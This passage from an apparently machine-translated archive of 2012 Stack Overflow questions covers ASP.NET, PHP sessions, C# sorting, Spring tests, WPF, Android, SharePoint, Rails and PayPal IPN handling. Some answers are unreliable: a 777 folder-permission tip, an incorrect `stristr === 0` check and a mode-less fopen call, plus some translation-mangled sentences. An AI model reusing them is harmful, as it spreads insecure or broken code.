                <asp:ListItem Value="26">Want 7</asp:ListItem>
                <asp:ListItem Value="27">Want 8</asp:ListItem>
                <asp:ListItem Value="28">Want 9</asp:ListItem>
                <asp:ListItem Value="29">Want 10</asp:ListItem>
                <asp:ListItem Value="30">Want 11</asp:ListItem>
                <asp:ListItem Value="31">Want 12</asp:ListItem>
                <asp:ListItem Value="32">Want 13</asp:ListItem>
                <asp:ListItem Value="33">Want 14</asp:ListItem>
                <asp:ListItem Value="34">Want 15</asp:ListItem>
                <asp:ListItem Value="35">Want 16</asp:ListItem>
                <asp:ListItem Value="36">Want 17</asp:ListItem>
                <asp:ListItem Value="37">Want 18</asp:ListItem>
                <asp:ListItem Value="38">Want 19</asp:ListItem>
                <asp:ListItem Value="39">Want 20</asp:ListItem>
                <asp:ListItem Value="40">Want 21</asp:ListItem>
            </asp:CheckBoxList>
        </td>
        <td>
        <asp:CheckBoxList ID="CheckBoxList2" runat="server">
                <asp:ListItem Value="41">Want 22</asp:ListItem>
                <asp:ListItem Value="42">Want 23</asp:ListItem>
                <asp:ListItem Value="43">Want 24</asp:ListItem>
                <asp:ListItem Value="44">Want 25</asp:ListItem>
                <asp:ListItem Value="45">Want 26</asp:ListItem>
                <asp:ListItem Value="46">Want 27</asp:ListItem>
                <asp:ListItem Value="47">Want 28</asp:ListItem>
                <asp:ListItem Value="48">Want 29</asp:ListItem>
                <asp:ListItem Value="49">Want 30</asp:ListItem>
                <asp:ListItem Value="50">Want 31</asp:ListItem>
                <asp:ListItem Value="51">Want 32</asp:ListItem>
                <asp:ListItem Value="52">Want 33</asp:ListItem>
                <asp:ListItem Value="53">Want 34</asp:ListItem>
                <asp:ListItem Value="54">Want 35</asp:ListItem>
                <asp:ListItem Value="55">Want 36</asp:ListItem>
                <asp:ListItem Value="56">Want 37</asp:ListItem>
                <asp:ListItem Value="57">Want 38</asp:ListItem>
                <asp:ListItem Value="58">Want 39</asp:ListItem>
                <asp:ListItem Value="59">Want 40</asp:ListItem>
                <asp:ListItem Value="60">Want 41</asp:ListItem>
                <asp:ListItem Value="61">Want 42</asp:ListItem>
            </asp:CheckBoxList>
        </td>
        </tr>
        <tr>
            <td class="style4">Comment TextBox column 62:</td>
            <td class="style2">
                <asp:TextBox ID="62" runat="server"></asp:TextBox>
            </td>
        </tr>
    <tr>
            <td>
              <asp:CheckBoxList ID="CheckBoxList3" runat="server">
                <asp:ListItem Value="63">Have 1</asp:ListItem>
                <asp:ListItem Value="64">Have 2</asp:ListItem>
                <asp:ListItem Value="65">Have 3</asp:ListItem>
              </asp:CheckBoxList>
    </td>
            <td>
              <asp:CheckBoxList ID="CheckBoxList4" runat="server">
                <asp:ListItem Value="66">Have 4</asp:ListItem>
                <asp:ListItem Value="67">Have 5</asp:ListItem>
              </asp:CheckBoxList>
    </td>
        </tr>
    </table>
</div>
<asp:Button ID="Button1" runat="server" Text="Submit" 
                         onclick="Button1_Click" />
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:45:34.177

**更新：**看到您的错误消息后，听起来您缺少尾随`}`. 从您的代码看来，您可以在最后添加一个以绕过此错误消息。基本上你现在没有结束`}`你的`_Default`班级声明。

* * *

我在您的代码中没有看到任何问题。我建议在 onclick 事件处理程序的第一行放置一个断点，然后逐行遍历代码以确认一切都按预期工作。确保使用“step into”（f11）​​，因为您有很多内部函数。也就是说，如果您以下列方式声明/添加参数，我认为您可以使您的代码更易于阅读（和调试）：

```
cmd.Parameters.Add(new SqlParameter("@MyParamter", "my value")); 
```

这可以消除 60 多行代码，并使这个问题更容易解决。

# php - 我收到有关 session_save_path() 的 php 警告

> ID：12429707
> 
> 赞同：0
> 
> 时间：2012-09-14T18:03:05.563
> 
> 标签：php, session

我正在使用 session_save_path() 将会话数据保存到文件中。

我遇到的问题是我在我的 Test1.php 文件中收到此警告：

`Warning: Unknown: open(Session//sess_f3n6jeu79lsq91s9romabg1752, O_RDWR) failed: No such file or directory (2) in Unknown on line 0 Warning: Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct (Session/) in Unknown on line 0`

我所做的是创建一个 init.php 并将下面的代码放在这个文件中：

```
<?php
 session_save_path('Session/'); 
 ?> 
```

然后在 Test1.php 文件中，我包含了以下代码：

```
<?php

ini_set('session.gc_maxlifetime',12*60*60);
ini_set('session.gc_divisor', '1');
ini_set('session.gc_probability', '1');
ini_set('session.cookie_lifetime', '0');
require_once 'init.php';                

session_start();

...

?> 
```

在我的目录中，它如下所示：

```
Session (Folder)
init.php (file)
Test1.php (file) 
```

我究竟做错了什么？是我出错的 session_save_path 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:07:49.287

看警告：

> 未知：打开（会话//sess_f3

有一个'/'太多了。正确的路径是：

```
session_save_path('Session'); 
```

确保**网络服务器进程**有权**访问**该文件夹。

webserver 进程必须是文件夹的所有者，权限为 700，或者 webserver 进程不是文件夹的所有者，权限为 777！

# php - 在 PHP 简单的 HTML DOM 解析器中获取有限的单词

> ID：12429709
> 
> 赞同：0
> 
> 时间：2012-09-14T18:03:14.627
> 
> 标签：php, parsing

看看这段代码
`echo file_get_html('http://www.google.com)->plaintext;`
，它将从网站获取全部内容。所以，我的问题是如何获取有限的单词。假设它只会获取 180 个单词.. 任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:29:36.353

file_get_html 创建一个 DOM 对象，它需要完整的页面加载/解析，因此您不一定能按字符数抓取。但是，您可以启动文件处理程序并 fread 到一定数量的字节：

```
$fh = fopen('google.com');
$data = fread($fh,$length);
fclose($fh); 
```

或这个：

```
 $data = substr(file_get_contents('google.com'),$start,$end); 
```

# c# - 如何对列表进行排序 ?

> ID：12429714
> 
> 赞同：2
> 
> 时间：2012-09-14T18:03:46.967
> 
> 标签：c#, asynchronous, wcf-ria-services

假设我有一个列表：

```
MyList = new List<MyEntity>(); 
```

然后我尝试将项目添加到列表中。WCF RIA 服务通过异步调用加载的每个项目。我希望 MyList 总是按 MyEntity 的属性排序，比如它的 ID，在添加任何新项目之后，

如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:05:10.630

您可以使用[SortedSet](http://msdn.microsoft.com/en-us/library/dd412070)保持排序

```
 SortedSet<int> x = new SortedSet<int>();

        x.Add(5);
        x.Add(1);
        x.Add(23);
        x.Add(51);

        foreach (var i in x)
            Console.WriteLine(i); 
```

将打印

```
1
5
23
51 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:27:36.710

你可以使用

```
Mylist.Sort(); 
```

或者

```
MyList.OrderBy(); 
```

可能后者对您来说会更好地指定一个属性

```
MyList.OrderBy(x => x.ID); 
```

正如其他人所说，这效率不高， SortedSet 将是更好的选择，但如果更改类型不是一种选择，那么这是一种可能性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T18:07:38.743

`List<T>`不是一个排序的容器，并且通过在插入之后调用排序来保持它的排序并不是最好的方法。改用按定义排序的容器，例如基于树的集合或`SortedSet`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-14T19:10:59.560

如果您使用 List<Entity> 集合非常重要，那么您可以使用 BinarySearch 来定位位置。

```
int index = MyList.BinarySearch(newMyEntity, yourComparer);
if (index < 0)
    MyList.Insert(~index, newMyEntity);
else
    // An identical item has been found. 
```

yourComparer 是 IComparer<MyEntity> 的一个实例。如果 MyEntity 实现 IComparable<MyEntity> 接口，则可以避免它。

请注意，插入语句的效率相当低，期望像 O(n/2) 这样的性能。

希望这对您的探索有所帮助。

# spring - SpringJUnit4ClassRunner 与 JUnit 测试套件错误

> ID：12429719
> 
> 赞同：5
> 
> 时间：2012-09-14T18:03:56.963
> 
> 标签：spring, ant, junit

我第一次尝试使用 Spring 设置 Junit 测试套件并尝试在我的类中进行一些更改，但没有运气并最终出现此错误：“junit.framework.AssertionFailedError: No tests found in Myclass”

简而言之，我有 2 个测试类都来自加载 Spring 上下文的同一个基类，如下所示

```
@RunWith( SpringJUnit4ClassRunner.class )
@ContextConfiguration( locations =
{
"classpath:ApplicationContext.xml"
}) 
```

我尝试将这两个测试类添加到一个套件中，如下所示

```
@RunWith( SpringJUnit4ClassRunner.class )
@SuiteClasses({ OneTest.class, TwoTest.class })
public class MyTestSuite extends TestCase {

//nothing here
} 
```

我正在从 ant 运行这个测试套件。但是，这给了我一个错误，说“没有找到测试”但是，如果我从 ant 运行单独的 2 个测试用例，它们就可以正常工作。不知道为什么会出现这种行为，我肯定在这里遗漏了一些东西。请指教。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-15T03:47:12.947

正如评论中提到的，我们使用 运行 TestSuite`@RunWith(Suite.class)`并使用 列出所有测试用例`@SuiteClasses({})`。为了不在每个测试用例中重复`@RunWith(SpringJunit4ClassRunner.class)`and `@ContextConfiguration(locations = {classpath:META-INF/spring.xml})`，我们创建了一个 AbstractTestCase，上面定义了这些注释，并为所有测试用例扩展了这个抽象类。示例如下：

```
/**
 * An abstract test case with spring runner configuration, used by all test cases.
 */
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations =
{ "classpath:META-INF/spring.xml" })
public abstract class AbstractSampleTestCase
{
}

public class SampleTestOne extends AbstractSampleTestCase
{
    @Resource
    private SampleInterface sampleInterface;

    @Test
    public void test()
    {
        assertNotNull(sampleInterface);
    }

}

public class SampleTestTwo extends AbstractSampleTestCase
{
    @Resource
    private SampleInterface sampleInterface;

    @Test
    public void test()
    {
        assertNotNull(sampleInterface);
    }

}

@RunWith(Suite.class)
@SuiteClasses(
{ SampleTestOne.class, SampleTestTwo.class })
public class SampleTestSuite
{
} 
```

如果你不想`AbstractSampleTest`有`SpringJunitSuiteRunner`一个`SpringJunitParameterizedRunner`.

# wpf - 资源字典定位器

> ID：12429725
> 
> 赞同：1
> 
> 时间：2012-09-14T18:04:28.013
> 
> 标签：wpf, mvvm

有没有办法创建 ResourceDictionary 定位器。现在我在 xaml 中：

```
 <ResourceDictionary>
            <ResourceDictionary.MergedDictionaries>
                <ResourceDictionary Source="../../Resources/StringResources.xaml"/>
            </ResourceDictionary.MergedDictionaries>
        </ResourceDictionary> 
```

后面的代码根据 currentculture 设置字典列表

我想拥有

```
 <ResourceDictionary>
            <ResourceDictionary.MergedDictionaries>
                <Locator "StringResources"/>
            </ResourceDictionary.MergedDictionaries>
        </ResourceDictionary> 
```

或类似的东西，我不必修改每个 v.xaml.cs 文件

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:33:27.117

您可以创建自己的 ResourceDictionary：

```
public class ResourceDictionaryLocator : ResourceDictionary
{
    public ResourceDictionaryLocator()
    {
        switch (CurrentLocalization)
        {
            case "English":
                base.Source = new Uri("pack://application:,,,/Languages/English.xaml");
                break;

            case "French":
                base.Source = new Uri("pack://application:,,,/Languages/French.xaml");
                break;
        }
    }
} 
```

然后像这样消费它：

```
<Application x:Class="TestingWPF.App"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
             xmlns:local="clr-namespace:TestingWPF"
             StartupUri="MainWindow.xaml">
    <Application.Resources>
        <ResourceDictionary>
            <ResourceDictionary.MergedDictionaries>
                <local:ResourceDictionaryLocator />
            </ResourceDictionary.MergedDictionaries>
        </ResourceDictionary>
    </Application.Resources>
</Application> 
```

但是，通常不这样做。您可以在运行时加载不同的资源字典。类似于以下内容：

```
Application.Current.Resources.MergedDictionaries.Clear();
Application.Current.Resources.MergedDictionaries.Add(dictionary); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:37:53.580

您可以创建一个`MarkupExtension`将返回请求的 ResourceDictionary：

```
public class ResourceDictionaryLocator : MarkupExtension
{
    public string DictionaryName { get; set; }

    public override object ProvideValue(IServiceProvider serviceProvider)
    {
        // Logic to return the wanted ResourceDictionary
        if (DictionaryName == "...")
        {
        }

        return null;
    }
} 
```

然后在 xaml 中使用它：

```
<ResourceDictionary>
    <ResourceDictionary.MergedDictionaries>
        <local:ResourceDictionaryLocator DictionaryName="StringResources" />
    </ResourceDictionary.MergedDictionaries>
</ResourceDictionary> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T18:25:35.293

我真的不知道这是否可行，但是您想让您的应用程序“可本地化”吗？Baybe 这篇文章可能对您有所帮助：http: [//www.codeproject.com/KB/WPF/WPF_Resx_Localization/](http://www.codeproject.com/KB/WPF/WPF_Resx_Localization/)。

# java - Controller属于Presentation层？

> ID：12429729
> 
> 赞同：16
> 
> 时间：2012-09-14T18:04:58.620
> 
> 标签：java, model-view-controller, design-patterns, spring-mvc

听说控制器属于表现层。这怎么可能？

我以为 ：

*   视图用于演示
*   模型用于业务逻辑
*   控制器用于控制逻辑

是否有很好的链接来证明控制器属于表示层？

《Spring MVC用于表示层》：如何只在表示层使用MVC？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-09-15T21:16:37.843

表示层包含视图***和***控制器。
您不能将 MVC 架构误认为是多层/层架构（尤其是 3 层架构）。大多数时候模型/视图/控制器不是 Web 应用程序的主要设计，它只是多层/层架构的一个子集。

看看这个过于简单的方案（你可以将 DAO 放在专用的数据访问层中，但这在本文中并不重要）：

![简化层](../Images/16314687c57ee52dce4e29ed3f7b50a1.png)

Spring MVC 是一个**表示框架**：它处理控制器和视图。但是为什么 Spring MVC 中的“M”呢？仅仅因为，与许多其他表示框架一样，它自然地处理模型/实体（“M”）的表示。这种表示是在您的控制器中使用的，在您的视图中显示，在您的表单中提交等。**这就是为什么框架被称为 Spring MVC，即使模型/实体不是表示层的一部分。**

我认为这是这个框架的一个好名字，因为它真的是面向“MVC”的。实际上，模型/实体的表示可以是：

*   direct ：框架直接处理模型/实体对象
*   间接：框架处理一个表单对象或 DTO，其中包含与一个或多个实体相关的信息

[Spring 的建议](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/mvc.html#mvc-features)是直接使用模型/实体（“M”）对象：

> 可复用的业务代码，无需重复。使用现有的业务对象作为命令或表单对象，而不是镜像它们来扩展特定的框架基类。

这就是为什么我说这个框架非常面向“MVC”，与其他框架相比，比如 Struts，你必须使用不同的表单对象。

一些有趣的链接：

*   [Multitier 和 MVC 架构之间的比较](http://en.wikipedia.org/wiki/Multitier_architecture#Comparison_with_the_MVC_architecture)，来自 Wikipedia
*   这篇关于ASP.NET 中[的三层架构的博客文章](http://geekswithblogs.net/edison/archive/2009/04/05/a-simple-3-tier-layers-application-in-asp.net.aspx)
*   [这个 3 层架构的博客图片](http://hugo.ferreira.cc/post/28234548880/the-mvc-and-3-tier-architectures-combined-via-the)
*   Spring 文档中的[DispatcherServlet 章节](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/mvc.html#mvc-servlet)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-14T18:19:33.237

控制器控制表示层逻辑。对于所有业务代码、事务用例、持久性等，它通常委托给服务层。

一种典型的做法是将事务服务实现为 spring bean 并将这些 spring bean 注入控制器中。典型用例：创建新产品：

1.  控制器从浏览器接收命令 bean
2.  它验证是否存在所有必需的数据，如果不存在，则重新显示带有错误消息的产品创建页面
3.  它调用服务 bean 来创建产品
4.  服务 bean 在事务中运行。它从数据库中获取产品类别，将产品附加到其类别，根据当前定价策略计算产品价格，向外部应用程序发送 JMS 消息，并返回创建的产品的 ID
5.  控制器使用创建的产品的 ID 作为 URL 参数重定向到产品详细信息页面。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T18:14:09.317

这在很大程度上取决于您使用的是哪种类型的 MVC，以及您在什么环境中使用它。

例如，ASP.NET MVC 完全是一种 UI 模式，因此所有三个部分都是表示的一部分。

然而，在 MVC 的大多数实现中，Controller 与用户交互，因此是 UI 层的一部分。它可以处理按钮按下和键盘输入……但在许多情况下，控制器还负责将模型和视图连接在一起。

一个普遍的事实是，如果您无法帮助，您不应该在控制器中执行业务逻辑。业务逻辑存在的位置取决于许多因素。在某些实现中它可能是模型的一部分，或者它可能是 MVC 之外的独立层

# java - 使用java对齐表列中的值

> ID：12429733
> 
> 赞同：0
> 
> 时间：2012-09-14T18:05:07.560
> 
> 标签：java

需要使用 Java 垂直对齐行/列单元格中的字符串。例如，我会在列中获得多个字符串

```
"A/B/C"
"B/C/D"
"D/E/F"
"A/C/D" 
```

输出需要出现在下面的行/列表中。

```
A|B|C| | |
 |B|C|D| |
 | | |D|E|F
A| |C|D| | 
```

任何机构都知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:16:19.983

就像是：

```
Read input string
Split it on / to get array of strings A1
Let A2 be another list of type String
for s in [ A, B, C, D, E ]
  if s is in A1
    Insert s in A2
   else
     Insert " " in A2

join A2 using '|' and print 
```

# javascript - 数据拉取完成前的页面渲染

> ID：12429737
> 
> 赞同：0
> 
> 时间：2012-09-14T18:05:36.293
> 
> 标签：javascript

我有两列。

左侧的列首先呈现（显然）。右侧的列是从数据拉取构建的注入代码。右侧的列在数据加载并可见之前完成了页面的呈现。因此，除非我多次刷新页面，否则右栏是空白的。

有没有办法减慢页面渲染速度？该页面在 ie 中正确呈现，但不是 ff 和 chrome。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:11:16.457

我怀疑您是否真的想减慢页面渲染速度，因为这会惹恼您的用户。您可能想要做的是改进您的代码，以便它正确替换包含您的右列的 div （或其他）的内容。使用 jQuery 之类的库将内容请求作为 AJAX 调用。没有代码示例，我无法为您提供更具体的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:14:34.767

不，但您可以延迟渲染右列，直到您的 ajax 调用完成。根据您使用的 Javascript 库，或者如果您使用的是原始 Javascript，应该有一种方法可以注册一个回调函数，以便在数据从服务器下载完成时回调。

在这个回调中加载你的数据，而不是依赖于延迟特定的时间，因为这总是错误的，对某些用户来说太慢而对其他用户来说太快。

# android - 修改后的 ListPreference 不调用它的对话框

> ID：12429742
> 
> 赞同：1
> 
> 时间：2012-09-14T18:06:08.227
> 
> 标签：android, dialog, listpreference

我有一个使用自定义 ListPreference 和 CheckBoxPreference 制作的 PreferenceScreen。这是名为“pref_screen_custom.xml”的 XML：

```
<?xml version="1.0" encoding="utf-8"?>
<PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android" >

<!-- My custom preference type.  This just replaces the actual widget
     portion of the preference, if the whole preference wanted to be
     replaced we would use the layout attribute instead of the widgetLayout
     attribute. -->
<com.pref_002.Pref002
        android:key="my_preference"
        android:title="Title: Pref002"
        android:summary="Summary: summary"
        android:defaultValue="-1"
        android:entries="@array/pref002_list_ent"
        android:entryValues="@array/pref002_list_vals"
        android:dialogTitle="title" />

<CheckBoxPreference
        android:key="advanced_checkbox_preference"
        android:title="Title: checkbox preference"
        android:summaryOn="On checkbox" 
        android:summaryOff="Off checkBox" />
</PreferenceScreen> 
```

保存首选项数组的 XML 是 (array.xml)：

```
<?xml version="1.0" encoding="utf-8"?>
<resources>

    <string-array name="pref002_list_ent">
        <item>T</item>
        <item>V</item>
        <item>S</item>
    </string-array>
    <string-array name="pref002_list_vals">
        <item>10</item>
        <item>8</item>
        <item>6</item>
    </string-array>

</resources> 
```

PreferenceScreen 的 .java，称为 PrefCustom002Activity.java，是：

```
package com.pref_002;

import android.os.Bundle;
import android.preference.PreferenceActivity;

public class PrefCustom002Activity extends PreferenceActivity
{
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        addPreferencesFromResource(R.xml.pref_screen_custom_001);
    }
} 
```

扩展 ListPreference 的类，称为“Prefs002.java”，是：

```
package com.pref_002;

import android.content.Context;
import android.preference.ListPreference;
import android.util.AttributeSet;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;

public class Pref002 extends ListPreference
{
    // Constructor called by the inflater
    public Pref002(Context context, AttributeSet attrs)
    {
        super(context, attrs);
    }
    @Override
    protected View onCreateView(ViewGroup parent)
    {
        // New Layout that will contain the default loaded View from ListPreference
        // plus a new one (a Button)
        LinearLayout newLayoutParent = new LinearLayout(getContext());
        newLayoutParent.setOrientation(LinearLayout.HORIZONTAL);
        newLayoutParent.setWeightSum(10.0f);

        // get the View returned from ListPreference 
        View listPreferenceDefaultView = super.onCreateView(parent);

        // new layout values for this View
        LinearLayout.LayoutParams params1 = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        params1.weight = 9.0f;

        listPreferenceDefaultView.setLayoutParams(params1);

        //--Button to be added to newLayoutParent --// 

        LinearLayout.LayoutParams params2 = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        params2.gravity = Gravity.CENTER_VERTICAL;
        params2.weight = 1.0f;

        Button b = new Button(getContext());
        b.setText("A button");
        b.setLayoutParams(params2);

        // add the two views
        newLayoutParent.addView(listPreferenceDefaultView);
        newLayoutParent.addView(b);
        newLayoutParent.setId(android.R.id.widget_frame);

        return newLayoutParent;
    }
} 
```

因此，正如您在“Prefs002.java”中看到的那样，我覆盖 onCreateView 为 ListPreference 制作一个新布局，该布局由一个 LinearLayout 组成，其中包含 ListPreference 自己创建的 View 以及一个位于右侧的新按钮ListPreference 生成的视图。从图形上看，这是可行的，但是如果我单击此新视图，则不会显示“首选项”对话框（当您单击它时，该行也不会变为黄色，但我可以通过添加 TouchListener 来解决此问题）。此外，根据文档，如果我覆盖 OnCreateView，我应该将“widget_frame”设置为新视图，并且我在该行 `newLayoutParent.setId(android.R.id.widget_frame);` 中进行了操作，但是当我单击此视图时不会出现对话框。

那么，如何调用这个自定义 ListPrerence 的 Dialog 呢？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:28:50.753

您可以通过调用 showDialog() (DialogPreference.showDialog) 来触发对话框。当您调用 super.onCreateView 时，返回的视图将已经有一个 ID 为 widget_frame 的视图。

我会建议这样的事情：

```
View v = super.onCreateView(parent);
View widgetFrame = v.findViewById(android.R.id.widget_frame);
// add/remove stuff into widgetFrame here
return v; 
```

# c# - 无法使用 javascript 检索 SPList 项目

> ID：12429743
> 
> 赞同：1
> 
> 时间：2012-09-14T18:06:08.643
> 
> 标签：c#, javascript, asp.net, .net, caml

我试图使用 javascript 在 Sharepoint 列表中搜索名为“John”的人。似乎查询失败，因为我收到错误警报：**请求失败。一种或多种字段类型未正确安装。转到列表设置页面以删除这些字段。不明确的**

这表明脚本以 onQueryFailed() 方法结束。我找不到 CAML 有任何问题，并且使用了内部列名。

来自 .aspx 的代码：

```
<script type="text/javascript">
            function MyJavascript() {
            var siteUrl = '/sites/MySite/';
            var clientContext = new SP.ClientContext(siteUrl);
            var oList = clientContext.get_web().get_lists().getByTitle('People');

            var camlQuery = new SP.CamlQuery();
            camlQuery.set_viewXml('<View><Query><Where><Eq><FieldRef Name="\'Name\'"/>' +
            '<Value Type=\'Text\'>John</Value></Eq></Where></Query></View>');
            this.collListItem = oList.getItems(camlQuery);

            clientContext.load(collListItem);
            clientContext.executeQueryAsync(Function.createDelegate(this, this.onQuerySucceeded), Function.createDelegate(this, this.onQueryFailed));

        }

        function onQuerySucceeded(sender, args) {
            var listItemInfo = '';

            var listItemEnumerator = collListItem.getEnumerator();
            while (listItemEnumerator.moveNext()) {
                var oListItem = listItemEnumerator.get_current();
                listItemInfo += '\nID: ' + oListItem.get_id() +
                '\nName: ' + oListItem.get_item('Name') +
                '\nAge: ' + oListItem.get_item('Age');
            }

            alert(listItemInfo.toString());
        }

        function onQueryFailed(sender, args) {
            alert('Request failed. ' + args.get_message() + '\n' + args.get_stackTrace());
        } 

        </script> 
```

将脚本注册到按钮的 .cs 代码：

```
SubmitButton.Attributes.Add("onclick", "MyJavascript(); return false;"); 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-29T01:15:46.397

尝试`ExecuteOrDelayUntilScriptLoaded(MyJavaScript, "sp.js");`直接放在`siteUrl`变量下方。

# ruby-on-rails - 制作引擎：找不到Lib类：未初始化的常量（NameError）

> ID：12429747
> 
> 赞同：0
> 
> 时间：2012-09-14T18:06:35.420
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.2

我正在构建一个 gem 并创建：

“/lib/gem_name/resource.rb”

```
module GemName
  class Resource
    def initialize
      # nothing
    end
  end
end 
```

并在“/lib/gem_name.rb”中

```
require "gem_name/engine"

module GemName
  def new_resource
    @resources << GemName::Resource.new
  end
end 
```

在“/test/dummy/config/initializers/gem_name.rb”

```
GemName.new_resource 
```

当我启动控制台时，显示此消息：

`unitialized constant GemName::Resource (NameError)`

我检查 gem_name.gemspec ，它的内容是：

```
$:.push File.expand_path("../lib", __FILE__)

# Maintain your gem's version:
require "gem_name/version"

# Describe your gem and declare its dependencies:
Gem::Specification.new do |s|
  s.name        = "gem_name"
  s.version     = GemName::VERSION
  s.authors     = ["TODO: Your name"]
  s.email       = ["TODO: Your email"]
  s.homepage    = "TODO"
  s.summary     = "TODO: Summary of GemName."
  s.description = "TODO: Description of GemName."

  s.files = Dir["{app,config,db,lib}/**/*"] + ["MIT-LICENSE", "Rakefile", "README.rdoc"]
  s.test_files = Dir["test/**/*"]

  s.add_dependency "rails", "~> 3.2.8"
  # s.add_dependency "jquery-rails"

  s.add_development_dependency "sqlite3"
end 
```

环境规格：

*   红宝石 1.9.2
*   导轨 3.2.8

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-16T06:28:42.783

也许您需要`gem_name/resource`直接在“/lib/gem_name.rb”文件中要求？

# php - PayPal IPN 未将 VERIFIED 返回为 0

> ID：12429750
> 
> 赞同：0
> 
> 时间：2012-09-14T18:06:51.940
> 
> 标签：php, paypal, paypal-ipn

我已经要求我的 paypal api 发送 $res 的电子邮件以查看响应是什么。在 while (!feof($fp)) {} 内

这就是我从 $res 到我的电子邮件的内容

```
HTTP/1.0 400 Bad Request
Server: BigIP
Connection: close
Content-Length: 19
Invalid Host header 
```

这是我的贝宝代码。

```
$req = 'cmd=_notify-validate';
$req .= payment_safe_check ($_POST);

$header .= "POST /cgi-bin/webscr HTTP/1.0\r\n";
$header .= "Content-Type: application/x-www-form-urlencoded\r\n";
$header .= "Content-Length: " . strlen($req) . "\r\n\r\n";

$mode = strtolower($paymod_data['PAYMENT_MODE']);

    mail("to email", "subject",serialize($_POST) );

if ($mode == 'test')
{
    $fp = fsockopen ('ssl://www.sandbox.paypal.com', 443, $errno, $errstr, 30);
}
else
{
    $fp = fsockopen ('ssl://www.paypal.com', 443, $errno, $errstr, 30);
}

if (!$fp)
{
    // HTTP ERROR
    die ("Error");
}
else 
{
    // NO HTTP ERROR
    fputs ( $fp, $header . $req );
    while (!feof($fp))
    {
        $res = fgets ($fp, 1024);
        if (strcmp ($res, "VERIFIED") == 0)
        {
            processing ( $_POST );
        }
        else if (strcmp ($res, "INVALID") == 0)
        {

        }
    }
    fclose ($fp);
} 
```

这不起作用，`if (strcmp ($res, "VERIFIED") == 0){}`但如果我将其更改为`if (strcmp ($res, "VERIFIED") == -1){}`它可以正常工作。

**更新**

我已将代码更改为

```
$mode = $paymod_data['PAYMENT_MODE'];
$paypal_url = ($mode == 'test') ? 'www.sandbox.paypal.com' : 'www.paypal.com';

$raw_post_data = file_get_contents('php://input');
$raw_post_array = explode('&', $raw_post_data);
$myPost = array();
foreach ($raw_post_array as $keyval)
{
  $keyval = explode ('=', $keyval);
  if (count($keyval) == 2)
     $myPost[$keyval[0]] = urldecode($keyval[1]);
}
// read the post from PayPal system and add 'cmd'
$req = 'cmd=_notify-validate';
$req .= payment_safe_check ($_REQUEST);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://'.$paypal_url.'/cgi-bin/webscr');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $req);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: '.$paypal_url));

$res = curl_exec($ch);
curl_close($ch);

if (strcmp ($res, "VERIFIED") == 0) {
    processing ( $_POST );
}
else if (strcmp ($res, "INVALID") == 0) {
    // log for manual investigation
} 
```

有人可以确认他们是否对此代码有任何问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T04:35:58.073

VERIFIED 和 INVALID 是您从 PAYPAL 收到响应后需要验证的两个响应。
您可以参考
[https://www.x.com/developers/PayPal/documentation-tools/code-sample/216623上的代码示例](https://www.x.com/developers/PayPal/documentation-tools/code-sample/216623)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:58:53.087

strcmp 检查一个字符串是否比另一个“大”。Is 区分大小写，可以被空格和换行符忽略。

我建议你改用

```
if ( stristr($res,"VERIFIED") === 0 )   {}
else if ( stristr($res,"INVALID") === 0 )   {} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-21T16:07:49.493

找不到网址中的问题...您必须将网址更改为如下...

```
$ch = curl_init('https://www.sandbox.paypal.com/cgi-bin/webscr');   // (for Sandbox IPNs)
$ch = curl_init(' https://www.paypal.com/cgi-bin/webscr');   // (for live IPNs) 
```

# excel - 使用循环在工作簿之间移动数据范围

> ID：12429761
> 
> 赞同：0
> 
> 时间：2012-09-14T18:08:11.370
> 
> 标签：excel, vba

